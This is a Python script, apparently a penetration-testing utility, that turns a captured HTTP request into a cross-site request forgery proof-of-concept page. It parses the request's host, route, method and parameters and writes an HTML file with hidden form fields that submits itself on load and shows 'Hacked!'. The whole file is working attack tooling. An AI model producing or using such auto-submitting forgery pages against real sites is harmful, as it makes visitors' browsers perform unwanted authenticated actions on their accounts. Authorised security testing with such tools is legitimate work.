#!/usr/bin/env python3

import os
import sys

def Banner():
    os.system('clear')
    print ("+------------------------------------------------------------------------------------------------------------------+")
    print ("| Author: glyph                                                                                                    |")
    print ("| Title: csrf2html.py                                                                                              |")
    print ("| Creation Date: 26/02/2020                                                                                        |")
    print ("| Version Control: 1.0 - Draft Concept                                                                             |")
    print ("| Description: This allows an pentester to produce a POC CSRF payload based on a captured HTTP GET/POST request.   |")
    print ("| Usage: " + sys.argv[0] + " <poc.txt> " + "\t\t                                                                   |")
    print ("+------------------------------------------------------------------------------------------------------------------+")

def Usage():
    print ("+---------------------------------------+")
    print ("| Usage: " + sys.argv[0] + " <poc.txt>\t\t|")
    print ("+---------------------------------------+")

def Main():
    print ("[+] Reading POC File")
    with open(sys.argv[1], "r") as f:
        data = f.readlines()

    global host
    global route
    global useragent
    global method
    global referer
    global contenttype
    global contentlength
    global cookie
    global body
    global stuff
    global inputType

    for i in range(len(data)):
        if ("POST" in str(data[i])):
            method = str(data[i])[:4].strip()
            route = str(data[i])[5:-10].strip()
        elif ("GET" in str(data[i])):
            method = str(data[i])[:3].strip()
            route = str(data[i])[4:-10].strip()
        elif ("Host" in str(data[i])):
            host = str(data[i])[6:].strip()
        elif ("User-Agent" in str(data[i])):
            useragent = str(data[i])[12:].strip()
        elif ("Referer" in str(data[i])):
            referer = str(data[i])[9:].strip()
        elif ("Content-Type" in str(data[i])):
            contenttype = str(data[i])[14:].strip()
        elif ("Content-Length" in str(data[i])):
            contentlength = str(data[i])[16:].strip()
        elif ("Cookie" in str(data[i])):
            cookie = str(data[i])[8:].strip()
        elif ("Upgrade-Insecure" in str(data[i])):
            pass
        elif ("Accept" in str(data[i])):
            pass
        elif ("DNT" in str(data[i])):
            pass
        elif ("Connection: close" in str(data[i])):
            pass
        elif ("=" in str(data[i])):
            body = str(data[i]).strip()
            params = body.split("&")
            inputType = ""
            for param in params:
                stuff = (param.split("="))
                inputType += (f"   <input type=\"hidden\" " + "name=\""+stuff[0]+ "\"" + " value=\"" + stuff[1]+ "\" " + "/>" + "\r\n ")

def writeFile():
    print ("\n[+] Output file: csrf.html")
    with open("csrf.html", "w") as f:
        make_html = ("<html>" + "\r\n ")
        make_html += ("<body>" + "\r\n ")
        make_html += ("Hacked!" + "\r\n ")
        make_html += ("  <form action=\"https://" + host + route + "\" " + "method=\"" + method + "\"" + ">" + "\r\n ")
        make_html += inputType
        make_html += ("  </form>" + "\r\n ")
        make_html += ("   <script>" + "\r\n ")
        make_html += ("      document.forms[0].submit();" + "\r\n ")
        make_html += ("   </script>" + "\r\n")
        make_html += (" </body>" + "\r\n")
        make_html += ("</html>" + "\r\n")
        f.write(make_html)
        print (make_html)

if __name__ == '__main__':
    if (len(sys.argv) == 2):
        Banner()
        Main()
        writeFile()
    else:
        os.system('clear')
        Usage()
